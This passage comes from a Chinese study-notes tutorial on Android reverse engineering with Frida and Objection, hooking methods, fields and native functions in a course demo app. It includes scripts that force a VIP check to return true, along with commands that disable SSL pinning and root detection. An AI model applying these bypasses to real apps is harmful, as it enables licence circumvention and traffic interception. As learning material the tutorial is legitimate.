          <a href="#hook重载自定义参数类型的函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#hook重载自定义参数类型的函数" class="headerlink" title="hook重载自定义参数类型的函数"></a>hook重载自定义参数类型的函数</h4>
      <p>借助smali代码来查看，比如如下Inner函数中的Animal参数类型</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118111631902.png" alt="image-20240118111631902"></p>
<p>切换为smali代码，第一个参数类型即为<code>com.zj.wuaipojie.Demo$Animal</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118111824561.png" alt="image-20240118111824561"></p>
<p>对应hook代码如下，修改第二个参数为”aaaaaaaaaa”</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//overload定义重载函数，根据函数的参数类型填</span></span><br><span class="line">    utils.Inner.overload(<span class="string">&#x27;com.zj.wuaipojie.Demo$Animal&#x27;</span>,<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a，b</span>)</span>&#123;</span><br><span class="line">        b = <span class="string">&quot;aaaaaaaaaa&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.Inner(a,b);</span><br><span class="line">        <span class="built_in">console</span>.log(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="hook构造函数"   >
          <a href="#hook构造函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#hook构造函数" class="headerlink" title="hook构造函数"></a>hook构造函数</h4>
      <p>用$init来表示构造函数，同样重载的构造函数也是类似的</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//修改类的构造函数的实现，$init表示构造函数</span></span><br><span class="line">    utils.$init.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(str);</span><br><span class="line">        str = <span class="string">&quot;52&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.$init(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="hook变量"   >
          <a href="#hook变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#hook变量" class="headerlink" title="hook变量"></a>hook变量</h4>
      <ul>
<li>静态变量</li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">utils.staticField.value = &quot;我是被修改的静态变量&quot;;</span><br><span class="line">console.log(utils.staticField.value);</span><br></pre></td></tr></table></div></figure>

<ul>
<li>实际变量</li>
</ul>
<p>注意字段名与函数名相同 前面加个下划线</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.choose(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//修改实例的非静态字段&quot;_privateInt&quot;的值为&quot;123456&quot;，并修改非静态字段&quot;privateInt&quot;的值为9999。</span></span><br><span class="line">        <span class="comment">//obj._privateInt.value = &quot;123456&quot;; //字段名与函数名相同 前面加个下划线</span></span><br><span class="line">        obj.privateInt.value = <span class="number">9999</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>

<p>实际上在这个例子里面，大佬说hoos是发生在obj.test()函数调用之后的，但是也很奇怪啊，如果是真的，那么应该是obj.test()函数之前的所有数据均无法被更改，反正很奇怪。</p>

        <h4 id="hook内部类"   >
          <a href="#hook内部类" class="heading-link"><i class="fas fa-link"></i></a><a href="#hook内部类" class="headerlink" title="hook内部类"></a>hook内部类</h4>
      <p>一样的，就是获取到目标类就行</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest6</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//内部类</span></span><br><span class="line">        <span class="keyword">var</span> innerClass = Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo$innerClass&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(innerClass);</span><br><span class="line">        innerClass.$init.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;eeeeeeee&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="枚举所有类与所有方法"   >
          <a href="#枚举所有类与所有方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#枚举所有类与所有方法" class="headerlink" title="枚举所有类与所有方法"></a>枚举所有类与所有方法</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest7</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//枚举所有的类与类的所有方法,异步枚举</span></span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span>(<span class="params">name,handle</span>)</span>&#123;</span><br><span class="line">                    <span class="comment">//过滤类名</span></span><br><span class="line">                <span class="keyword">if</span>(name.indexOf(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>) !=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(name);</span><br><span class="line">                    <span class="keyword">var</span> clazz =Java.use(name);</span><br><span class="line">                    <span class="built_in">console</span>.log(clazz);</span><br><span class="line">                    <span class="keyword">var</span> methods = clazz.class.getDeclaredMethods();</span><br><span class="line">                    <span class="built_in">console</span>.log(methods);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="枚举所有方法"   >
          <a href="#枚举所有方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#枚举所有方法" class="headerlink" title="枚举所有方法"></a>枚举所有方法</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest8</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Demo = Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//getDeclaredMethods枚举所有方法</span></span><br><span class="line">        <span class="keyword">var</span> methods =Demo.class.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j &lt; methods.length; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = methods[j].getName();</span><br><span class="line">            <span class="built_in">console</span>.log(methodName);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k=<span class="number">0</span>; k&lt;Demo[methodName].overloads.length;k++)&#123;</span><br><span class="line">                Demo[methodName].overloads[k].implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="built_in">arguments</span>.length;i++)&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>[methodName].apply(<span class="built_in">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="主动调用"   >
          <a href="#主动调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#主动调用" class="headerlink" title="主动调用"></a>主动调用</h4>
      <ul>
<li><p>静态方法</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var ClassName=Java.use(&quot;com.zj.wuaipojie.Demo&quot;); </span><br><span class="line">ClassName.privateFunc(&quot;传参&quot;);</span><br></pre></td></tr></table></div></figure></li>
<li><p>非静态方法</p>
<p>和变量类似，都是要获取对应类的对象</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ret = <span class="literal">null</span>;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.choose(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>,&#123;    <span class="comment">//要hook的类</span></span><br><span class="line">        <span class="attr">onMatch</span>:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">            ret=instance.privateFunc(<span class="string">&quot;aaaaaaa&quot;</span>); <span class="comment">//要hook的方法</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//return ret;</span></span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="十四、是时候学习一下Frida一把梭了-中"   >
          <a href="#十四、是时候学习一下Frida一把梭了-中" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、是时候学习一下Frida一把梭了-中" class="headerlink" title="十四、是时候学习一下Frida一把梭了(中)"></a>十四、是时候学习一下Frida一把梭了(中)</h2>
      
        <h3 id="Objection用法"   >
          <a href="#Objection用法" class="heading-link"><i class="fas fa-link"></i></a><a href="#Objection用法" class="headerlink" title="Objection用法"></a>Objection用法</h3>
      <p>objection是基于frida的命令行hook集合工具, 可以让你不写代码, 敲几句命令就可以对java函数的高颗粒度hook, 还支持RPC调用。可以实现诸如内存搜索、类和模块搜索、方法hook打印参数返回值调用栈等常用功能，是一个非常方便的，逆向必备、内存漫游神器。</p>

        <h3 id="常用API"   >
          <a href="#常用API" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3>
      <ul>
<li><p>objection -g 包名 explore：即开始探索，会直接启动应用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118150720659.png" alt="image-20240118150720659"></p>
<p>objection -g 进程名 explore –startup-command “android hooking watch class 路径.类名” ：代表启动应用前就开始Hook，命令为后面的那个  </p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118151237102.png" alt="image-20240118151237102"></p>
</li>
<li><p>memory list modules  -查看内存中加载的库</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118150732300.png" alt="image-20240118150732300"></p>
<p>memory list exports so名称 - 查看库的导出函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118150751024.png" alt="image-20240118150751024"></p>
</li>
<li><p>android hooking list activities -查看内存中加载的activity  /android </p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118150813676.png" alt="image-20240118150813676"></p>
<p>android hooking list services -查看内存中加载的services，好像不太兼容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118151512199.png" alt="image-20240118151512199"></p>
</li>
<li><p>android intent launch_activity activity名称：可以直接拉起某个activity</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118151701274.png" alt="image-20240118151701274"></p>
</li>
<li><p>关闭ssl校验：android sslpinning disable</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118152005591.png" alt="image-20240118152005591"></p>
</li>
<li><p>关闭root校验：android root disable</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118152022712.png" alt="image-20240118152022712"></p>
</li>
</ul>

        <h3 id="Objection内存漫游"   >
          <a href="#Objection内存漫游" class="heading-link"><i class="fas fa-link"></i></a><a href="#Objection内存漫游" class="headerlink" title="Objection内存漫游"></a>Objection内存漫游</h3>
      <p>从内存中查看数据</p>
<ul>
<li><p>android heap search instances 类名(命令)：查看某个类对象</p>
<p>这是内存中没加载的情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118152210186.png" alt="image-20240118152210186"></p>
<p>有加载的是如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118152358178.png" alt="image-20240118152358178"></p>
</li>
<li><p>android heap execute [hashcode] getPublicInt(实例的hashcode+方法名) ：调用实例的方法</p>
<ul>
<li><p>无参函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118152604269.png" alt="image-20240118152604269"></p>
</li>
<li><p>有参函数</p>
<p>进入evaluate编辑界面，clazz.a(“ssss”)，即调用clazz这个实例中的a方法，传入参数为”ssss”，然后按照提示按ESC，然后Enter即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118152850895.png" alt="image-20240118152850895"></p>
</li>
</ul>
</li>
<li><p>android hooking list classes -列出内存中所有的类(结果比静态分析的更准确)，用的不多</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118153051217.png" alt="image-20240118153051217"></p>
</li>
<li><p>android hooking search classes 关键类名 -在内存中所有已加载的类中搜索包含特定关键词的类，以<code>wuaipojie</code>为关键词</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118153217665.png" alt="image-20240118153217665"></p>
</li>
<li><p>android hooking search methods 关键方法名 -在内存中所有已加载的类的方法中搜索包含特定关键词的方法(一般不建议使用，特别耗时，还可能崩溃)</p>
</li>
<li><p>android hooking list class_methods 类名 -内存漫游类中的所有方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118153340743.png" alt="image-20240118153340743"></p>
</li>
</ul>

        <h3 id="Objection的HOOK"   >
          <a href="#Objection的HOOK" class="heading-link"><i class="fas fa-link"></i></a><a href="#Objection的HOOK" class="headerlink" title="Objection的HOOK"></a>Objection的HOOK</h3>
      <p>这个HOOK并不会使得这些方法失效，相当于只是查看</p>
<ul>
<li><p>android hooking watch class 类名 ：hook类的所有方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118153605750.png" alt="image-20240118153605750"></p>
</li>
<li><p>android hooking watch class_method 类名.方法名 –dump-args –dump-return –dump-backtrace ：hook方法的参数、返回值和调用栈</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118154010669.png" alt="image-20240118154010669"></p>
</li>
<li><p>android hooking watch class_method 类名.$init ：hook构造函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118154626876.png" alt="image-20240118154626876"></p>
</li>
</ul>

        <h2 id="十五、是时候学习一下Frida一把梭了-下"   >
          <a href="#十五、是时候学习一下Frida一把梭了-下" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、是时候学习一下Frida一把梭了-下" class="headerlink" title="十五、是时候学习一下Frida一把梭了(下)"></a>十五、是时候学习一下Frida一把梭了(下)</h2>
      
        <h3 id="打印导入表-导出表"   >
          <a href="#打印导入表-导出表" class="heading-link"><i class="fas fa-link"></i></a><a href="#打印导入表-导出表" class="headerlink" title="打印导入表/导出表"></a>打印导入表/导出表</h3>
      <p>貌似需要frida14，frida16可能写法有点出入</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//打印导入表</span></span><br><span class="line">        <span class="keyword">var</span> imports = Module.enumerateImports(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>; i &lt; imports.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(imports[i].name == <span class="string">&quot;vip&quot;</span>)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(imports[i])); <span class="comment">//通过JSON.stringify打印object数据</span></span><br><span class="line">                <span class="built_in">console</span>.log(imports[i].address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打印导出表</span></span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">exports</span> = Module.enumerateExports(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>; i &lt; <span class="built_in">exports</span>.length;i++)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(<span class="built_in">exports</span>[i]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="静态注册JNI函数HOOK"   >
          <a href="#静态注册JNI函数HOOK" class="heading-link"><i class="fas fa-link"></i></a><a href="#静态注册JNI函数HOOK" class="headerlink" title="静态注册JNI函数HOOK"></a>静态注册JNI函数HOOK</h3>
      <ul>
<li><p>JAVA层，同样也是获取到类之后重新实现一下函数就行</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> SecurityUtil = Java.use(<span class="string">&quot;com.zj.wuaipojie.util.SecurityUtil&quot;</span>);</span><br><span class="line">    SecurityUtil[<span class="string">&quot;checkVip&quot;</span>].implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;checkVip is called!&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> ret = <span class="built_in">this</span>.checkVip();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;checkVip ret value is &quot;</span> + ret);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>SO层，即需要通过函数名称获取</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">        <span class="keyword">var</span> helloAddr = Module.findExportByName(<span class="string">&quot;lib52pojie.so&quot;</span>,<span class="string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_checkVip&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(helloAddr); </span><br><span class="line">        <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">//Interceptor.attach是Frida里的一个拦截器</span></span><br><span class="line">            Interceptor.attach(helloAddr,&#123;</span><br><span class="line">                <span class="comment">//onEnter里可以打印和修改参数</span></span><br><span class="line">                <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;  <span class="comment">//args传入参数</span></span><br><span class="line">                    <span class="built_in">console</span>.log(args[<span class="number">0</span>]);  <span class="comment">//打印第一个参数的值</span></span><br><span class="line">    </span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">//onLeave里可以打印和修改返回值</span></span><br><span class="line">                <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                    <span class="built_in">console</span>.log(retval);</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;retval&quot;</span>,retval.toInt32());</span><br><span class="line">                    retval.replace(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="SO层HOOK打印"   >
          <a href="#SO层HOOK打印" class="heading-link"><i class="fas fa-link"></i></a><a href="#SO层HOOK打印" class="headerlink" title="SO层HOOK打印"></a>SO层HOOK打印</h3>
      <ul>
<li><p>寄存器</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(this.context.x1);  // 打印寄存器内容</span><br></pre></td></tr></table></div></figure></li>
<li><p>整数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(args[1].toInt32()); //toInt32()转十进制</span><br></pre></td></tr></table></div></figure></li>
<li><p>Char字符形式</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(args[2].readCString()); //读取字符串 char类型</span><br></pre></td></tr></table></div></figure></li>
<li><p>字符串形式</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一</span></span><br><span class="line"><span class="keyword">var</span> jString = Java.cast(args[<span class="number">2</span>], Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;参数:&quot;</span>, jString.toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法二</span></span><br><span class="line"><span class="keyword">var</span> JNIEnv = Java.vm.getEnv();</span><br><span class="line"><span class="keyword">var</span> originalStrPtr = JNIEnv.getStringUtfChars(args[<span class="number">2</span>], <span class="literal">null</span>).readCString();        </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;参数:&quot;</span>, originalStrPtr); </span><br></pre></td></tr></table></div></figure></li>
<li><p>内存DUMP</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(hexdump(args[2])); //内存dump</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118172755247.png" alt="image-20240118172755247"></p>
</li>
</ul>

        <h3 id="SO层HOOK修改"   >
          <a href="#SO层HOOK修改" class="heading-link"><i class="fas fa-link"></i></a><a href="#SO层HOOK修改" class="headerlink" title="SO层HOOK修改"></a>SO层HOOK修改</h3>
      <ul>
<li><p>整数</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改参数</span></span><br><span class="line">args[<span class="number">0</span>] = ptr(<span class="number">1000</span>); <span class="comment">//第一个参数修改为整数 1000，先转为指针再赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改返回值</span></span><br><span class="line">retval.replace(<span class="number">20000</span>);  <span class="comment">//返回值修改</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>字符串修改</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改参数</span></span><br><span class="line"><span class="keyword">var</span> modifiedContent = <span class="string">&quot;至尊&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> newJString = JNIEnv.newStringUtf(modifiedContent);</span><br><span class="line">args[<span class="number">2</span>] = newJString;     </span><br><span class="line"></span><br><span class="line"><span class="comment">//修改返回值</span></span><br><span class="line"><span class="keyword">var</span> modifiedContent = <span class="string">&quot;无敌&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> newJString = JNIEnv.newStringUtf(modifiedContent);</span><br><span class="line">retval.replace(newJString);</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="SO基地址获取"   >
          <a href="#SO基地址获取" class="heading-link"><i class="fas fa-link"></i></a><a href="#SO基地址获取" class="headerlink" title="SO基地址获取"></a>SO基地址获取</h3>
